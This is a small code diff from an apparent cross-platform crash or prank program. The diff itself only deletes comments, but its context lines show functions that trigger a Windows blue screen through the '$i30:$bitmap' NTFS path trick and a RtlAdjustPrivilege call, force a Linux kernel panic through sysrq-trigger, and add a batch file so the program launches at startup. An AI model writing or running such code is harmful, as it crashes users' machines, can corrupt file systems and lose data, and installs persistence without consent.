@@ -18,7 +18,6 @@ def get_os():
     else:
         return "Unsupported"
 
-# Windows-specific functions
 def bsod():
     subprocess.call("cd C:\:$i30:$bitmap", shell=True)
     ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
@@ -30,7 +29,6 @@ def startup(path):
     with open(os.path.join(bat_path, "open.bat"), "w+") as bat_file:
         bat_file.write(f'start "" "{path}"')
 
-# Linux-specific functions
 def simulate_kernel_panic():
     subprocess.call("echo 1 | sudo tee /proc/sys/kernel/sysrq", shell=True)
     subprocess.call("echo c | sudo tee /proc/sysrq-trigger", shell=True)
@@ -50,7 +48,6 @@ def remove_from_startup():
     if os.path.exists(desktop_file_path):
         os.remove(desktop_file_path)
 
-# Common uninstall function for both Windows and Linux
 def uninstall(wind):
     wind.destroy()
     os_type = get_os()
